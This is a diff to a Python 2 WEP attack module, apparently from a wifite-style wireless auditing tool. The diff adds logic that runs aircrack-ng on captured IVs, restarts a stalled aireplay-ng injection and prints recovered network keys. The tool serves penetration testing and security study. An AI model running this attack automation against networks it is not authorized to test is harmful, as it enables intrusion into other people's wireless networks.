@@ -3,9 +3,11 @@
 from Attack import Attack
 from Airodump import Airodump
 from Aireplay import Aireplay, WEPAttackType
+from Aircrack import Aircrack
 from Configuration import Configuration
 from Interface import Interface
 from Color import Color
+from CrackResultWEP import CrackResultWEP
 
 import time
 
@@ -18,6 +20,7 @@ class AttackWEP(Attack):
 
     def __init__(self, target):
         super(AttackWEP, self).__init__(target)
+        self.crack_result = None
 
     def run(self):
         '''
@@ -64,45 +67,111 @@ class AttackWEP(Attack):
                                     wep_attack_type, \
                                     client_mac=client_mac)
 
+                time_unchanged_ivs = time.time() # Timestamp when IVs last changed
+                previous_ivs = 0
+
                 # Loop until attack completes.
                 while True:
                     airodump_target = self.wait_for_target(airodump)
-                    Color.p('\r{+} WEP attack {C}%s{W} ({G}%d IVs{W}) '
+                    Color.p('\r{+} running {C}%s{W} WEP attack ({G}%d IVs{W}) '
                         % (attack_name, airodump_target.ivs))
 
-                    # TODO: Check if we cracked it.
-                    # if aircrack and aircrack.cracked():
+                    # Check if we cracked it.
+                    if aircrack and aircrack.is_cracked():
+                        (hex_key, ascii_key) = aircrack.get_key_hex_ascii()
+                        bssid = airodump_target.bssid
+                        if airodump_target.essid_known:
+                            essid = airodump_target.essid
+                        else:
+                            essid = None
+                        print '\n'
+                        Color.pl('{+} {C}%s{W} WEP attack {G}successful{W}'
+                            % attack_name)
+                        print ''
+                        if essid:
+                            Color.pl('{+}     ESSID: {C}%s{W}' % essid)
+                        Color.pl('{+}     BSSID: {C}%s{W}' % bssid)
+                        Color.pl('{+}   Hex Key: {G}%s{W}' % hex_key)
+                        if ascii_key:
+                            Color.pl('{+} Ascii Key: {G}%s{W}' % ascii_key)
+                        if aireplay:
+                            aireplay.stop()
+                        self.crack_result = CrackResultWEP(bssid, \
+                                                           essid, \
+                                                           hex_key, \
+                                                           ascii_key)
+                        return True
 
                     # Check number of IVs, crack if necessary
                     if airodump_target.ivs > Configuration.wep_crack_at_ivs:
-                        # TODO:
-                        # 1. Check if we're already trying to crack:
-                        #     aircrack and aircrack.is_running()
-                        # 2. If not, start cracking:
-                        #     aircrack = Aircrack(airodump_target, capfile)
-                        pass
+                        if not aircrack:
+                            # Aircrack hasn't started yet.
+                            # Find the .ivs file.
+                            ivs_file = None
+                            for fil in airodump.find_files(endswith='.ivs'):
+                                ivs_file = fil
+                                break
+                            if not ivs_file:
+                                Color.pl('{!} {O}no .ivs file found, stopping{W}')
+                                break
+                            else:
+                                Color.pl('\n{+} started {C}cracking{W}')
+                                aircrack = Aircrack(ivs_file)
+
+                        elif not aircrack.is_running():
+                            # Aircrack stopped running.
+                            Color.pl('\n{!} {O}aircrack stopped running!{W}')
+                            ivs_file = None
+                            for fil in airodump.find_files(endswith='.ivs'):
+                                ivs_file = fil
+                                break
+                            if ivs_file:
+                                Color.pl('{+} restarting {C}aircrack{W}')
+                                aircrack = Aircrack(ivs_file)
+                            else:
+                                # No .ivs file and aircrack stopped, error?
+                                Color.pl('{!} {O}no .ivs file found, stopping{W}')
+                                break
+                        elif aircrack.is_running():
+                            # TODO: Restart aircrack after X seconds
+                            pass
+                            
 
                     if not aireplay.is_running():
                         # Some Aireplay attacks loop infinitely
                         if attack_name == 'chopchop' or attack_name == 'fragment':
-                            print '\nChopChop stopped, output:'
-                            print aireplay.get_output()
                             # We expect these to stop once a .xor is created
-                            # TODO:
-                            # Check for .xor file.
-                            # If it's not there, the process failed. Check stdout.
-                            # If xor exists, run packetforge-ng on it.
-                            # If packetforge created the .cap file to replay, then replay it
-                            #     Change attack_name to 'forged arp replay'
-                            #     Start Aireplay by replaying the cap file
-                            pass
-                        else:
-                            print '\naireplay.get_output() =', aireplay.get_output()
-                            raise Exception('Aireplay exited unexpectedly')
+                            #    or if the process failed.
 
-                    # TODO:
-                    # Replay: Check if IVS stopped flowing (same for > 20 sec)
-                    #         If so, restart the Replay attack.
+                            # TODO: Check for .xor file.
+                            # If .xor is not there, the process failed. Check stdout.
+                            # XXX: For debugging
+                            print '\n%s stopped, output:' % attack_name
+                            print aireplay.get_output()
+                            break
+
+                            # If .xor exists, run packetforge-ng to create .cap
+                            # If packetforge created the replay .cap file,
+                            #   1. Change attack_name to 'forged arp replay'
+                            #   2. Start Aireplay to replay the .cap file
+                        else:
+                            Color.pl('\n{!} {O}aireplay-ng exited unexpectedly{W}')
+                            print '\naireplay.get_output():'
+                            print aireplay.get_output()
+                            break
+
+                    # Check if IVS stopped flowing (same for > N seconds)
+                    if airodump_target.ivs > previous_ivs:
+                        time_unchanged_ivs = time.time()
+                    elif Configuration.wep_restart_stale_ivs > 0:
+                        stale_seconds = time.time() - time_unchanged_ivs
+                        if stale_seconds > Configuration.wep_restart_stale_ivs:
+                            # No new IVs within threshold, restart aireplay
+                            aireplay.stop()
+                            aireplay = Aireplay(self.target, \
+                                                wep_attack_type, \
+                                                client_mac=client_mac)
+                    previous_ivs = airodump_target.ivs
 
                     time.sleep(1)
                     continue
